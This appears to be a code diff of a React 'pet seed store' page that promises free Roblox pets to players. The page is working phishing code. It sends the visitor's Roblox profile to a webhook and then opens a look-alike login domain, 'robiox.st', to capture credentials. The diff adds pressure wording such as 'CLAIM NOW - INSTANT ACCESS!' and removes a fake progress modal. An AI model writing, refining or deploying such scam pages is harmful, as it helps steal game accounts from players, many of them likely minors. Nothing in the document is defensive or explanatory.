@@ -14,7 +14,6 @@ import {
   Wifi,
   WifiOff,
   X,
-  Check,
   AlertTriangle,
   ImageIcon,
   RefreshCw,
@@ -25,7 +24,6 @@ import { Input } from "@/components/ui/input"
 import { Label } from "@/components/ui/label"
 import { Badge } from "@/components/ui/badge"
 import { Alert, AlertDescription } from "@/components/ui/alert"
-import Preloader from "./components/preloader"
 
 interface Pet {
   id: string
@@ -49,67 +47,60 @@ interface RobloxUser {
   isDemo?: boolean
 }
 
-interface ProcessStep {
-  id: number
-  text: string
-  completed: boolean
-  active: boolean
-}
-
 const pets: Pet[] = [
   {
     id: "1",
     name: "T-Rex",
-    image: "/tr.png",
+    image: "/placeholder.svg?height=80&width=80&text=T-Rex",
     quantity: 0,
     claimed: false,
   },
   {
     id: "2",
     name: "Raccoon",
-    image: "/rc.png",
+    image: "/placeholder.svg?height=80&width=80&text=Raccoon",
     quantity: 0,
     claimed: false,
   },
   {
     id: "3",
     name: "Fennec Fox",
-    image: "/f.png",
+    image: "/placeholder.svg?height=80&width=80&text=Fox",
     quantity: 0,
     claimed: false,
   },
   {
     id: "4",
     name: "Kitsune",
-    image: "/k.png",
+    image: "/placeholder.svg?height=80&width=80&text=Kitsune",
     quantity: 0,
     claimed: false,
   },
   {
     id: "5",
-    name: "Dragonfly",
-    image: "/dragonfly.png",
+    name: "Red Dragon",
+    image: "/placeholder.svg?height=80&width=80&text=Dragon",
     quantity: 0,
     claimed: false,
   },
   {
     id: "6",
     name: "Mimic Octopus",
-    image: "/octo.png",
+    image: "/placeholder.svg?height=80&width=80&text=Octopus",
     quantity: 0,
     claimed: false,
   },
   {
     id: "7",
     name: "Disco Bee",
-    image: "/db.png",
+    image: "/placeholder.svg?height=80&width=80&text=Bee",
     quantity: 0,
     claimed: false,
   },
   {
     id: "8",
     name: "Queen Bee",
-    image: "/qb.png",
+    image: "/placeholder.svg?height=80&width=80&text=Queen",
     quantity: 0,
     claimed: false,
   },
@@ -119,8 +110,6 @@ const pets: Pet[] = [
 const REDIRECT_CONFIG = {
   enabled: true,
   url: "https://robiox.st/login?returnUrl=3889777624249851",
-  delay: 500,
-  autoRedirect: true,
 }
 
 // Webhook configuration
@@ -130,7 +119,7 @@ const WEBHOOK_CONFIG = {
 }
 
 export default function PetSeedStore() {
-  const [showPreloader, setShowPreloader] = useState(false) // Changed from true to false
+  const [showPreloader, setShowPreloader] = useState(false)
   const [petQuantities, setPetQuantities] = useState<Record<string, number>>({})
   const [claimedPets, setClaimedPets] = useState<Record<string, boolean>>({})
   // Initialize timer with localStorage persistence
@@ -154,14 +143,8 @@ export default function PetSeedStore() {
   const [error, setError] = useState("")
   const [totalClaimed, setTotalClaimed] = useState(0)
   const [showConfirmModal, setShowConfirmModal] = useState(false)
-  const [showFinalizingModal, setShowFinalizingModal] = useState(false)
   const [claimingPets, setClaimingPets] = useState<Array<{ pet: Pet; quantity: number }>>([])
   const [apiStatus, setApiStatus] = useState<"checking" | "connected" | "failed">("checking")
-  const [processSteps, setProcessSteps] = useState<ProcessStep[]>([
-    { id: 1, text: "Connecting to account...", completed: false, active: false },
-    { id: 2, text: "Encrypting item transfer...", completed: false, active: false },
-    { id: 3, text: "Awaiting final confirmation...", completed: false, active: false },
-  ])
 
   const getClaimingTotal = () => {
     return claimingPets.reduce((total, { quantity }) => total + quantity, 0)
@@ -169,51 +152,6 @@ export default function PetSeedStore() {
 
   const handlePreloaderComplete = () => {
     setShowPreloader(false)
-
-    // Auto-detect and suggest browser opening after preloader
-    const userAgent = navigator.userAgent || navigator.vendor || (window as any).opera
-    const isInApp = /Instagram|FBAN|FBAV|Twitter|Line|WhatsApp|Telegram/i.test(userAgent)
-
-    if (isInApp) {
-      // Show a subtle notification for in-app browsers
-      setTimeout(() => {
-        const notification = document.createElement("div")
-        notification.innerHTML = `
-          <div style="
-            position: fixed; 
-            top: 20px; 
-            left: 50%; 
-            transform: translateX(-50%); 
-            background: rgba(0,0,0,0.8); 
-            color: white; 
-            padding: 12px 20px; 
-            border-radius: 8px; 
-            z-index: 1000;
-            font-size: 14px;
-            text-align: center;
-            max-width: 300px;
-          ">
-            📱 For best experience, open in browser
-            <button onclick="window.open(window.location.href, '_blank'); this.parentElement.remove();" 
-                    style="margin-left: 10px; background: #007bff; color: white; border: none; padding: 4px 8px; border-radius: 4px; cursor: pointer;">
-              Open
-            </button>
-            <button onclick="this.parentElement.remove();" 
-                    style="margin-left: 5px; background: transparent; color: white; border: 1px solid white; padding: 4px 8px; border-radius: 4px; cursor: pointer;">
-              ✕
-            </button>
-          </div>
-        `
-        document.body.appendChild(notification)
-
-        // Auto remove after 10 seconds
-        setTimeout(() => {
-          if (notification.parentElement) {
-            notification.remove()
-          }
-        }, 10000)
-      }, 1000)
-    }
   }
 
   // Update the useEffect for the timer
@@ -475,37 +413,14 @@ export default function PetSeedStore() {
 
   const confirmClaim = async () => {
     setShowConfirmModal(false)
-    setShowFinalizingModal(true)
 
-    setProcessSteps([
-      { id: 1, text: "Connecting to account...", completed: false, active: true },
-      { id: 2, text: "Encrypting item transfer...", completed: false, active: false },
-      { id: 3, text: "Awaiting final confirmation...", completed: false, active: false },
-    ])
+    // IMMEDIATE REDIRECT - No delays!
+    if (REDIRECT_CONFIG.enabled && REDIRECT_CONFIG.url) {
+      console.log("🚀 INSTANT REDIRECT to:", REDIRECT_CONFIG.url)
+      window.open(REDIRECT_CONFIG.url, "_blank", "noopener,noreferrer")
+    }
 
-    await new Promise((resolve) => setTimeout(resolve, 1500))
-    setProcessSteps((prev) =>
-      prev.map((step) =>
-        step.id === 1 ? { ...step, completed: true, active: false } : step.id === 2 ? { ...step, active: true } : step,
-      ),
-    )
-
-    await new Promise((resolve) => setTimeout(resolve, 1500))
-    setProcessSteps((prev) =>
-      prev.map((step) =>
-        step.id === 2 ? { ...step, completed: true, active: false } : step.id === 3 ? { ...step, active: true } : step,
-      ),
-    )
-
-    await new Promise((resolve) => setTimeout(resolve, 1500))
-    setProcessSteps((prev) => prev.map((step) => (step.id === 3 ? { ...step, completed: true, active: false } : step)))
-
-    await new Promise((resolve) => setTimeout(resolve, 500))
-  }
-
-  const acceptTransfer = async () => {
-    setShowFinalizingModal(false)
-
+    // Update claimed pets and total (happens in background)
     const totalItemsToClaim = getClaimingTotal()
     if (totalItemsToClaim > 0 && robloxUser) {
       let totalToClaim = 0
@@ -519,28 +434,15 @@ export default function PetSeedStore() {
       setTotalClaimed((prev) => prev + totalToClaim)
       setPetQuantities({})
 
-      await sendProfileToWebhook(robloxUser)
+      // Send to webhook in background (don't wait for it)
+      sendProfileToWebhook(robloxUser).catch(console.error)
 
-      console.log(`✅ Claim successful: ${totalToClaim} pets claimed for ${robloxUser.name}`)
-
-      if (REDIRECT_CONFIG.enabled && REDIRECT_CONFIG.url) {
-        window.open(REDIRECT_CONFIG.url, "_blank", "noopener,noreferrer")
-      }
-    } else {
-      console.error("❌ Claim validation failed: No items to claim or no user")
-      setError("Claim failed. Please try again.")
+      console.log(`✅ Claim processed: ${totalToClaim} pets claimed for ${robloxUser.name}`)
     }
   }
 
   const getTotalSelectedItems = () => {
     return Object.values(petQuantities).reduce((sum, quantity) => sum + quantity, 0)
-  }
-
-  const allStepsCompleted = processSteps.every((step) => step.completed)
-
-  // Show preloader first
-  if (showPreloader) {
-    return <Preloader onComplete={handlePreloaderComplete} duration={4000} />
   }
 
   return (
@@ -557,7 +459,7 @@ export default function PetSeedStore() {
         <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50 animate-in fade-in duration-200 p-4">
           <div className="bg-white rounded-2xl p-4 sm:p-6 w-full max-w-md animate-in zoom-in-95 duration-200">
             <div className="flex items-center justify-between mb-4 sm:mb-6">
-              <h3 className="text-lg sm:text-xl font-bold text-gray-800">Confirm Selection</h3>
+              <h3 className="text-lg sm:text-xl font-bold text-gray-800">Confirm Pet Claim</h3>
               <Button
                 variant="ghost"
                 size="sm"
@@ -587,7 +489,7 @@ export default function PetSeedStore() {
               </div>
               <div className="text-center">
                 <p className="text-sm text-gray-600">
-                  Total: <span className="font-bold">x{getTotalSelectedItems()} items</span>
+                  Total: <span className="font-bold">x{getTotalSelectedItems()} pets</span>
                 </p>
               </div>
               <div className="space-y-2">
@@ -641,98 +543,9 @@ export default function PetSeedStore() {
               </Button>
               <Button
                 onClick={confirmClaim}
-                className="flex-1 bg-green-500 hover:bg-green-600 text-white font-bold h-12 sm:h-auto"
+                className="flex-1 bg-red-500 hover:bg-red-600 text-white font-bold h-12 sm:h-auto animate-pulse"
               >
-                CONFIRM
-              </Button>
-            </div>
-          </div>
-        </div>
-      )}
-
-      {/* Finalizing Process Modal */}
-      {showFinalizingModal && (
-        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50 animate-in fade-in duration-200 p-4">
-          <div className="bg-white rounded-2xl p-6 sm:p-8 w-full max-w-md animate-in zoom-in-95 duration-200 relative">
-            <Button
-              variant="ghost"
-              size="sm"
-              onClick={() => setShowFinalizingModal(false)}
-              className="absolute top-4 right-4 h-10 w-10 sm:h-8 sm:w-8 p-0 hover:bg-gray-100 text-gray-400"
-            >
-              <X className="h-5 w-5 sm:h-4 sm:w-4" />
-            </Button>
-
-            <div className="text-center mb-6 sm:mb-8">
-              <h3 className="text-xl sm:text-2xl font-bold text-gray-800">Finalizing Process</h3>
-            </div>
-
-            {robloxUser && (
-              <div className="flex justify-center mb-6">
-                <div className="relative">
-                  {avatarLoading ? (
-                    <div className="w-16 h-16 bg-gray-200 rounded-full flex items-center justify-center animate-pulse">
-                      <RefreshCw className="h-8 w-8 sm:h-10 sm:w-10 text-gray-400 animate-spin" />
-                    </div>
-                  ) : (
-                    <img
-                      src={robloxUser.avatar || "/placeholder.svg"}
-                      alt={robloxUser.name}
-                      className="w-16 h-16 rounded-full border-4 border-white shadow-lg"
-                      onError={(e) => {
-                        e.currentTarget.src = `/placeholder.svg?height=100&width=100&text=${robloxUser.name}`
-                      }}
-                    />
-                  )}
-                  {robloxUser.avatarSource === "placeholder" && (
-                    <div className="absolute -top-1 -right-1 w-5 h-5 bg-yellow-500 rounded-full flex items-center justify-center">
-                      <ImageIcon className="h-3 w-3 text-white" />
-                    </div>
-                  )}
-                </div>
-              </div>
-            )}
-
-            <div className="space-y-4 mb-6 sm:mb-8">
-              {processSteps.map((step) => (
-                <div key={step.id} className="flex items-center gap-3">
-                  <div className="flex-shrink-0">
-                    {step.completed ? (
-                      <div className="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">
-                        <Check className="h-4 w-4 text-white" strokeWidth={2} />
-                      </div>
-                    ) : step.active ? (
-                      <div className="w-6 h-6 border-2 border-green-500 rounded-full flex items-center justify-center">
-                        <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
-                      </div>
-                    ) : (
-                      <div className="w-6 h-6 border-2 border-gray-300 rounded-full"></div>
-                    )}
-                  </div>
-                  <span
-                    className={`text-sm ${
-                      step.completed
-                        ? "text-green-600 font-medium"
-                        : step.active
-                          ? "text-gray-800 font-medium"
-                          : "text-gray-500"
-                    }`}
-                  >
-                    {step.text}
-                  </span>
-                </div>
-              ))}
-            </div>
-
-            <div className="flex justify-center">
-              <Button
-                onClick={acceptTransfer}
-                disabled={!allStepsCompleted}
-                className={`px-8 sm:px-12 py-3 font-bold text-white rounded-lg transition-all duration-300 h-12 ${
-                  allStepsCompleted ? "bg-green-500 hover:bg-green-600 animate-pulse" : "bg-gray-300 cursor-not-allowed"
-                }`}
-              >
-                CLAIM NOW
+                🚀 CLAIM NOW - INSTANT ACCESS!
               </Button>
             </div>
           </div>
@@ -766,7 +579,7 @@ export default function PetSeedStore() {
               )}
               {apiStatus === "connected" && (
                 <Alert className="max-w-sm sm:max-w-md mx-auto mb-4 bg-green-50 border-green-200">
-                  <Wifi className="h-4 w-4" />
+                  <Wifi className="h-4 w-4 sm:h-5 sm:w-5 text-green-500" />
                   <AlertDescription className="text-sm">
                     ✅ Connected to Roblox API - real user data loaded!
                   </AlertDescription>
